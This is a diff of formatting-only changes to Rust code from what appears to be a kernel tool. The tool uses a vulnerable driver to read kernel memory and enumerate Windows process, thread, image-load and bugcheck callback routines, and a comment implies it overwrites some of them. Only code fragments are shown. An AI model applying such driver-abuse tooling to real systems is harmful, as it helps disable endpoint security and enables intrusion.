@@ -216,9 +216,7 @@ unsafe fn read_kernel_memory(
         deploy::read_physical_memory(driver, device_handle, kernel_addr, buffer)
     } else {
         // Driver expects a physical address. Translate VA → PA first.
-        let cr3_val = cr3.context(
-            "CR3 required for VA→PA translation with this driver",
-        )?;
+        let cr3_val = cr3.context("CR3 required for VA→PA translation with this driver")?;
         let phys_addr = translate_va_to_pa(driver, device_handle, cr3_val, kernel_addr)?;
         deploy::read_physical_memory(driver, device_handle, phys_addr, buffer)
     }
@@ -381,7 +379,11 @@ pub fn resolve_kernel_symbol(
 
 /// Identify the owner module of a kernel address by checking which loaded
 /// module's address range contains it.
-fn identify_module(_driver: &super::driver_db::VulnerableDriver, _device_handle: usize, addr: u64) -> Result<String> {
+fn identify_module(
+    _driver: &super::driver_db::VulnerableDriver,
+    _device_handle: usize,
+    addr: u64,
+) -> Result<String> {
     let mut buf_size: u32 = 0;
 
     unsafe {
@@ -469,7 +471,9 @@ fn walk_callback_array(
         // Read the pointer at this index.
         let offset = i * 8;
         let block_ptr = u64::from_le_bytes(
-            array_data[offset..offset + 8].try_into().unwrap_or([0u8; 8]),
+            array_data[offset..offset + 8]
+                .try_into()
+                .unwrap_or([0u8; 8]),
         );
 
         if block_ptr == 0 {
@@ -638,8 +642,14 @@ pub fn scan_callbacks(deployed: &DeployedDriver) -> Result<ScanResult> {
     // Step 2: Resolve the callback list symbols.
     // These are the primary callback routine arrays in ntoskrnl.
     let symbols = [
-        ("PspCreateProcessNotifyRoutine", CallbackListType::ProcessCreate),
-        ("PspCreateThreadNotifyRoutine", CallbackListType::ThreadCreate),
+        (
+            "PspCreateProcessNotifyRoutine",
+            CallbackListType::ProcessCreate,
+        ),
+        (
+            "PspCreateThreadNotifyRoutine",
+            CallbackListType::ThreadCreate,
+        ),
         ("PspLoadImageNotifyRoutine", CallbackListType::ImageLoad),
     ];
 
@@ -648,27 +658,15 @@ pub fn scan_callbacks(deployed: &DeployedDriver) -> Result<ScanResult> {
     for (symbol, list_type) in &symbols {
         match resolve_kernel_symbol(driver, device_handle, kernel_base, symbol) {
             Ok(addr) => {
-                log::info!(
-                    "Resolved {} at 0x{:016X}",
-                    symbol,
-                    addr
-                );
+                log::info!("Resolved {} at 0x{:016X}", symbol, addr);
 
                 match walk_callback_array(driver, device_handle, addr, *list_type) {
                     Ok(cbs) => {
-                        log::info!(
-                            "Found {} callbacks in {}",
-                            cbs.len(),
-                            symbol
-                        );
+                        log::info!("Found {} callbacks in {}", cbs.len(), symbol);
                         all_callbacks.extend(cbs);
                     }
                     Err(e) => {
-                        log::warn!(
-                            "Failed to walk callback array at {}: {}",
-                            symbol,
-                            e
-                        );
+                        log::warn!("Failed to walk callback array at {}: {}", symbol, e);
                     }
                 }
             }
@@ -680,8 +678,12 @@ pub fn scan_callbacks(deployed: &DeployedDriver) -> Result<ScanResult> {
 
     // Step 3: Walk KeBugCheckCallbackListHead (linked list, NOT an array).
     // BugCheck callbacks are NEVER overwritten — enumerated for detection only.
-    match resolve_kernel_symbol(driver, device_handle, kernel_base, "KeBugCheckCallbackListHead")
-    {
+    match resolve_kernel_symbol(
+        driver,
+        device_handle,
+        kernel_base,
+        "KeBugCheckCallbackListHead",
+    ) {
         Ok(list_head) => {
             log::info!(
                 "Resolved KeBugCheckCallbackListHead at 0x{:016X}",
@@ -790,11 +792,7 @@ fn walk_linked_callback_list(
                 }
             }
             Err(e) => {
-                log::warn!(
-                    "Failed to read callback entry at 0x{:016X}: {}",
-                    current,
-                    e
-                );
+                log::warn!("Failed to read callback entry at 0x{:016X}: {}", current, e);
                 break;
             }
         }
